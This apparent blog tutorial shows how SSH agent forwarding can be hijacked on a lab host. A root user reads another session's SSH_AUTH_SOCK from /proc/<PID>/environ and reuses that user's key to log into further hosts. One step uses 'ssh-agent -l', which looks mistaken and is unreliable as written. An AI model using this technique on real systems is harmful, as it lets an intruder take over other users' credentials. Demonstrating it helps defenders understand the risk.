---
layout: post
title:  "SSH Agent Hijacking"
date:   2019-09-06 23:06:00 -0400
categories: linux ssh security hijacking
---
Use of SSH Agent Forwarding is a common way to enable re-using SSH keys from a source and jumping through multiple hosts
over SSH. However, this method comes with a potential risk of hijacking where compromise could mean a malicious actor
using the SSH keys to access downstream hosts without the user knowing. This quick tutorial demonstrates how SSH
hijacking can occur.

### Setup

This example assumes you already have SSH keys created and the public key contents residing within the `authorized_keys` file
of the remote host (thus allowing key-based access to the remote host). Let's assume the remote host IP address is
`10.11.12.13` and your user ID is `joe`. Let's also assume the remote host is running a CentOS 7.2 OS.

### SSH Access with Forwarding

First, open a terminal session and SSH to the remote host using your SSH key and agent forwarding. If this does not work, it's
likely that `AllowAgentForwarding` is set to `no` in the `/etc/ssh/sshd_config` file of the remote host. If this is the case,
change it to `yes` and restart the `sshd` service for this test.

{% highlight bash %}
$ ssh -A joe@10.11.12.13
{% endhighlight %}

Once you're on the remote instance, you can test that the agent forwarding worked by running the following command, which
should show the fingerprint of the represented SSH key file:

{% highlight bash %}
$ ssh-add -l
{% endhighlight %}

If this shows the fingerprint of the SSH key used to access the instance, you have successfully SSH'd to the target instance
using SSH forwarding. Keep this terminal window open.

### SSH Hijacking

Now open a second window. SSH to the same target instance (`10.11.12.13`) without agent forwarding, and switch to the root
user as though you were another user on the same instance with root privileges:

{% highlight bash %}
$ ssh joe@10.11.12.13
$ sudo su -
{% endhighlight %}

We'll now perform the hijack. Granted, performing hijacking in this scenario does require the root account based on the
SSH agent socket permissions, but any compromise or user's ability to access the socket can result in the potential to
hijack. We'll install a quick utility that helps visualize the process tree for the SSH session as well.

{% highlight bash %}
# install pstree utility
$ yum install psmisc
$ pstree -p joe
# this utility will show the process trees of all processes
# associated with the user joe - find the process with the
# following signature:
#   sshd(<PID>) -- bash(<PID>)
# the <PID> of the bash process is the PID you need for
# the following steps

# capture the SSH_AUTH_SOCK variable out of the environment
# for the ssh agent process:
$ cat /proc/<PID>/environ | tr '\0' '\n' | grep SSH_AUTH_SOCK

# you can test that the capture is working and an identity is
# present by running the following command, which should show
# the same fingerprint for the identity
$ SSH_AUTH_SOCK=<PREVIOUS_CAPTURE> ssh-agent -l

# now use the ssh identity to access a remote instance where
# you know the identity is in the authorized_keys file - to test
# easily, you can simply use 'localhost' since this host has
# the identity in the authorized_keys file
$ SSH_AUTH_SOCK=<PREVIOUS_CAPTURE> ssh joe@localhost
{% endhighlight %}

If all goes well, you will be SSH'd into the local VM without a password using the SSH key of the other session.

### Credit

The above tutorial was pieced together with some information from the following sites/resources:

* [SSH Agent Hijacking](https://www.clockwork.com/news/2012/09/28/602/ssh_agent_hijacking/)
